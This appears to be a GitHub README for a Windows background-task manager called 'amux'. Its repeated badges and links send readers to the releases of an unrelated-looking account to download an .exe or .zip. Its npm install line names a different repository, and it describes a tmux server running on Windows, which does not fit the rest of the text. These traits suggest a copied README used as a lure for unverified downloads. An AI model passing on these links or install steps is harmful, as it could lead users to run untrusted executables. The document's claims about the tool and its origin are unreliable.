# 🛠️ amux - Manage Background Tasks Easily

[![Download amux](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Zero-inadequateness813/amux/releases)

---

## 📋 What is amux?

amux is a tool that helps you run and watch commands in the background on your Windows PC. Think of it like having multiple small screens (called panels) that run different tasks at the same time. Each task runs separately and keeps working even if you close the main window. You can check the output of these tasks whenever you want without missing a single line.

For example, you can run a program, check test results, or build files all at once and switch between them easily.

---

## 🖥️ How does amux work?

amux uses a system like "tmux," a program that allows multiple command windows to run in a single place. amux creates a special tmux server on your PC that is separate from any other tmux sessions you might have. 

- You get sessions. Each session acts like a workspace.
- Inside a session, you have windows (tabs).
- Inside each window, you have panels. Each panel runs one command and keeps running in the background.
- You can see the output of all panels and never lose any lines, even if you close the main window.

This setup lets you run different tasks at the same time and keep track of all their outputs easily.

---

## 💻 System Requirements

- Windows 10 or newer
- Node.js installed on your computer (a program that lets your system run JavaScript tools)
- Administrative rights to install software
- An internet connection to download amux

If you don’t have Node.js, download it from https://nodejs.org and install before continuing.

---

## 🚀 Getting Started: Download and Install amux on Windows

[![Download amux](https://img.shields.io/badge/Download-Visit%20Releases-green?style=for-the-badge)](https://github.com/Zero-inadequateness813/amux/releases)

1. **Visit the download page**  
   Go to the amux release page:  
   https://github.com/Zero-inadequateness813/amux/releases

2. **Download the latest version**  
   Look for the latest release at the top. You will find files listed there.  
   Download the Windows version if it is available (usually ends with `.exe` or `.zip`).

3. **Install Node.js** (if you haven’t already)  
   - Go to https://nodejs.org  
   - Download the Windows installer (LTS version recommended)  
   - Run the installer and follow the steps.

4. **Open Windows Command Prompt**  
   Press `Win + R`, type `cmd`, and hit Enter.

5. **Install amux via command**  
   In the command window, copy and paste this line and press Enter:  
   ```
   npm install -g https://github.com/tobi/amux
   ```
   This command downloads and installs amux on your system. It might take a few minutes.

6. **Check installation**  
   Once the command finishes, type:  
   ```
   amux --help
   ```  
   You should see instructions on how to use amux. If you do, amux has installed correctly.

---

## 📂 How to Use amux on Windows

1. **Start a new session**  
   Open Command Prompt and type:  
   ```
   amux new my-session
   ```  
   This creates a new session called “my-session.”

2. **Add panels (tasks) to your session**  
   Inside the session, you can add panels that run commands. For example:  
   ```
   amux add my-session "ping google.com"
   ```  
   This opens a panel that runs the ping command.

3. **View output from panels**  
   To see what each panel shows, run:  
   ```
   amux attach my-session
   ```  
   This opens the window with all your panels. You can switch between them.

4. **Keep tasks running in the background**  
   Even if you close the Command Prompt, amux keeps the tasks running. When you return, you can attach to the session to see the output.

5. **Stop a session**  
   When done, stop the session by typing:  
   ```
   amux kill my-session
   ```

---

## 🔧 Common Commands

| Command                     | Description                                |
|-----------------------------|--------------------------------------------|
| `amux new <session-name>`    | Create a new session                        |
| `amux add <session-name> "<command>"` | Add a panel to run a command            |
| `amux attach <session-name>` | View the session with all panels           |
| `amux kill <session-name>`   | Stop and remove the session                  |
| `amux list`                  | List all active sessions                      |

Replace `<session-name>` with a name you choose.

---

## 🛡️ Troubleshooting Tips

- If `npm` is not recognized, make sure Node.js is installed and added to your system Path.
- If installation fails, try running Command Prompt as Administrator:  
  Right-click Command Prompt > Run as Administrator.
- If amux commands do not work, close and reopen Command Prompt or restart your PC.
- Visit the release page if you want the newest version or if you want to download manually:  
  https://github.com/Zero-inadequateness813/amux/releases

---

## 📝 About This Software

amux helps you run multiple commands at the same time without losing track. It is useful for developers, system administrators, or anyone who needs to keep many tasks running in the background.

It saves the output of each task so you don’t miss anything. It’s like having a control center for your background jobs.

---

## 📥 Download amux

[![Download amux](https://img.shields.io/badge/Download-Visit%20Releases-orange?style=for-the-badge)](https://github.com/Zero-inadequateness813/amux/releases)

Visit the link above to get the latest files for Windows. Follow the instructions here to install and start using amux.